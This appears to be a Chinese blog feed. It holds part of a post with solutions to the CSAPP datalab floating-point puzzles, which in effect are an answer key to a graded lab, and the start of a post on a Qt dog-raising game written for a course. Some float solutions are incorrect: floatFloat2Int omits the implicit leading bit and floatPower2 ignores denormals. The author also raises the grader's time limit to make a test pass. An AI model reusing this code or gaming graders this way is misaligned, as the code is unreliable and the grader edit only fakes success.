&#123;<br>        <span class="hljs-keyword">return</span> uf;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0</span>)<br>    &#123;<br>        frac &lt;&lt;= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-built_in">exp</span>++;   <br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>题目要求：将目标 float 数据强制转换为 int 型数据。</p><p><del>这道题一开始写错了，又灰溜溜去找解析🤐</del></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/float%E7%BB%84%E6%88%90.png"></p><p>找了一张这样的图看上去更直观一点</p><ul><li><code>exp=0</code>，也就是阶码全是0的非规格化数，此时 <code>E=1- (128-1)= -126</code>，我们认为这是一个非常接近 0 的数，所以可以直接 <code>return 0</code></li><li><code>exp=255</code>，也就是 0XFF 最大值，特殊值NaN直接返回整数型的最大值 <code>return 0x80000000u</code></li><li><code>exp!=0&amp;&amp;exp!=255</code> ，也就是规格化的情况。此时 <code>E=exp-127</code> ，又分为下面几种情况：<ul><li>E &lt; 0 时，V&lt;1，<code>return 0</code></li><li>E &gt;&#x3D; 23，则进行加权时，需要 frac 左移 <code>(E-23)</code> 位</li><li>0 &lt; E &lt; 23，需要FRAC右移 <code>(23-E)</code> 位</li><li>E &gt; 31，Infinity 直接 <code>return 0</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsign int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <span class="hljs-type">int</span> E=<span class="hljs-built_in">exp</span><span class="hljs-number">-127</span>;<br>    <br>    <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(E&gt;=<span class="hljs-number">31</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">23</span>) frac&gt;&gt;=(<span class="hljs-number">23</span> - E);<br>        <span class="hljs-keyword">else</span> frac&lt;&lt;=(E - <span class="hljs-number">23</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(s==<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>题目要求：实现 <code>pow(2,x)</code>，返回结果为 <code>unsigned</code> </p><p>因为题目是实现2的阶乘，我们直接在二进制的基础上左移就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsign value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &gt;= <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>复习题目可以发现很多读书漏掉的重要东西</p><p>第一次做完实验也就浅浅错了三道题 11 个测试罢了🥲</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab_result_1.png"></p><p>最后一道题总是TIMEOUT，看了别的师傅的也是这样干脆改了 <code>btest.c</code> 里的时限</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab%E5%AE%8C%E7%BB%93.png"></p><p>完结撒花撒花~</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用QT做个养成类小游戏</title>
    <link href="/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>记录短学期作业的完成过程</p><span id="more"></span><p>我的队友是ChatGPT，致敬人工智能👩🏼‍💻</p><p>“小狗撑起一个家” 是一款有趣的小狗养成类游戏，让玩家体验养育可爱小狗、打理家庭和参与各种冒险的乐趣。在这个游戏中，玩家将扮演一位爱心满满的主人，收养一只可爱的小狗，并与它一起建立一个幸福的家庭。</p><hr><h3 id="1-工具准备"><a href="#1-工具准备" class="headerlink" title="1.工具准备"></a>1.工具准备</h3><ul><li>可以编译c++程序的编译器，和编写代码的软件。我使用的是VSCode，后期直接用QTCreat写了</li><li>QT Creator和Qt Designer（其实QT Creator一个集合环境就可以全部实现，但是我每次设置新增页面的样式表都会卡死。为了避免卡死丢失数据我选择用Qt Designer单独完成ui界面的设置）</li></ul><h3 id="2-题目"><a href="#2-题目" class="headerlink" title="2.题目"></a>2.题目</h3><p>基于QT开发一款动物世界小游戏</p><p>目的：模拟一个动物家庭。通过设计和编写该程序，锻炼结构化程序设计和面向对象的基本编程技能，提高程序组织的合理性、可读性和可维护性。</p><p>要求：设计一个爱心家庭；功能包括有若干动物家庭成员，模拟成员日常的吃、玩、病、以及购物、工作、做家务等功能。建议采用良好的控制台人机交互界面。 </p><blockquote><p>最后只实现了一个狗狗家庭成员</p></blockquote><p>问题描述：</p><p>（1）  初始时具有基本的生命特征和生存条件。</p><p>（2）  当吃东西后，体重增加，体能增加；</p><p>（3）  当锻炼后，体重下降，体能下降，要求恢复体力；</p><p>（4）  干活后，体能下降，爱心增加，能力增加；</p><p>（5）  打工后，体能下降，经验和金钱上升，爱心增加；</p><p>（6）  没有食品，就处于饥饿状态，报警；</p><p>（7）  买食品，需要付出金钱；</p><p>要求有商店、商店中有多种类商品，工作也有多个种类。</p><h3 id="3-流程"><a href="#3-流程" class="headerlink" title="3.流程"></a>3.流程</h3><h5 id="3-1-正经流程"><a href="#3-1-正经流程" class="headerlink" title="3.1 正经流程"></a>3.1 正经流程</h5><ul><li>游戏开始</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_16-21-26.png"></p><ul><li>游戏流程</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_20-56-38.png"></p><ul><li>家庭属性和成员属性</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_21-39-59.png"></p><h5 id="3-2-游戏规则"><a href="#3-2-游戏规则" class="headerlink" title="3.2 游戏规则"></a>3.2 游戏规则</h5><p>首先开局家庭中有10金币，食物储存为0，爱心数量为5，可选择一位动物家庭成员。</p><p>我爱小狗，所有动物成员都是小狗，可选不同品种，不同品种有不同的特点。</p><p>收养新的家庭成员需要消耗爱心，每一只狗狗消耗五颗爱心，把十只狗狗狗领养回家可以获得一个荣誉。做家务和打工都可以获得爱心。爱心每达到十的倍数就奖励一颗爱心。</p><p>在游戏过程中，购买食物需要消耗金币，动物家庭成员外出打工可以赚金币，金币达到666可获得一个荣誉。</p><p>动物家庭成员刚刚到家时的体力为10（体力满为10），能力为0。打工和做家务都需要消耗体力，进食可以补充体力。体力低于3不能锻炼、打工和做家务，体力低于2即体力为1时会提示，体力为0就会生病。做家务和打工都可以增加能力，只有能力达到5，同时体力大于3才能外出打工。</p><p>大型犬和小型犬每次活动的消耗和回报不一样。</p><h3 id="5-部分代码"><a href="#5-部分代码" class="headerlink" title="5.部分代码"></a>5.部分代码</h3><h4 id="5-1-QT内类的实现"><a href="#5-1-QT内类的实现" class="headerlink" title="5.1 QT内类的实现"></a>5.1 QT内类的实现</h4><p>Dog类示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DOG_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOG_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QPixmap&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span><br><span class="hljs-class">&#123;</span><br>protected:<br>    <span class="hljs-type">int</span> ability;    <span class="hljs-comment">//能力</span><br>    <span class="hljs-type">double</span> energy;   <span class="hljs-comment">//精力</span><br>    QString name;   <span class="hljs-comment">//名字</span><br>    <span class="hljs-type">int</span> ill;     <span class="hljs-comment">//疾病状态</span><br>    <span class="hljs-type">int</span> worktime;  <span class="hljs-comment">//判断工作时长</span><br>    <span class="hljs-type">int</span> state;  <span class="hljs-comment">//判断是否正在忙碌</span><br><br>public:<br><br>    Dog();<br>    virtual ~Dog();<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">DogGrow</span><span class="hljs-params">()</span>;   <span class="hljs-comment">//日常精力消耗</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogName</span><span class="hljs-params">(QString Dogname)</span>;   <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">resetDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span>;<br><br>    QString <span class="hljs-title function_">getDogName</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogAbility</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-title function_">getDogEnergy</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogState</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogWorktime</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">judgeDogIll</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doHousework</span><span class="hljs-params">()</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BigDog</span> :</span> public Dog<br>&#123;<br>public:<br>    BigDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmallDog</span> :</span> public Dog<br>&#123;<br>public:<br>    SmallDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// DOG_H</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;family.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QInputDialog&gt;</span></span><br><br><br>Dog::<span class="hljs-built_in">Dog</span>()<br>&#123;<br>    ill=<span class="hljs-number">0</span>;<br>    ability=<span class="hljs-number">0</span>;<br>    energy=<span class="hljs-number">10</span>;<br>    state=<span class="hljs-number">0</span>;<br>    worktime=<span class="hljs-number">0</span>;<br>&#125;<br><br>Dog::~<span class="hljs-built_in">Dog</span>() &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::DogGrow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(ill==<span class="hljs-number">1</span>||energy&lt;=<span class="hljs-number">0.0</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">//如果小狗生病了，就直接退回不会发生经历的的消耗</span><br><br>    <span class="hljs-keyword">if</span>(state==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(energy<span class="hljs-number">-1</span>&lt;=<span class="hljs-number">0.0</span>)<br>        &#123;<br>            energy=<span class="hljs-number">0.0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            energy--;  <span class="hljs-comment">//日常活动默认精力减一</span><br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        state=<span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogName</span><span class="hljs-params">(QString Dogname)</span></span><br><span class="hljs-function"></span>&#123;<br>    name=Dogname;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy=Dogenergy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span></span><br><span class="hljs-function"></span>&#123;<br>    ability=Dogability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::resetDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=<span class="hljs-number">0</span>;<br>    ill=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span></span><br><span class="hljs-function"></span>&#123;<br>    ill=DogIll;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span></span><br><span class="hljs-function"></span>&#123;<br>    state=Dogstate;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=Worktime;<br>&#125;<br><br><span class="hljs-function">QString <span class="hljs-title">Dog::getDogName</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">Dog::getDogEnergy</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> energy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogAbility</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ill;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogState</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogWorktime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> worktime;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::judgeDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(energy==<span class="hljs-number">0.0</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(worktime==<span class="hljs-number">5</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::doHousework</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;做家务&quot;</span>, <span class="hljs-string">&quot;小狗帮忙家务一小时，快夸夸小狗！\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;做家务&quot;</span>, <span class="hljs-string">&quot;小狗很累，快为小狗补充体力吧！\n&quot;</span>);<br>    &#125;<br>&#125;<br><br>BigDog::<span class="hljs-built_in">BigDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += (food / <span class="hljs-number">2.0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy -= (<span class="hljs-number">1</span> / <span class="hljs-number">2.0</span>);<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;打工&quot;</span>, <span 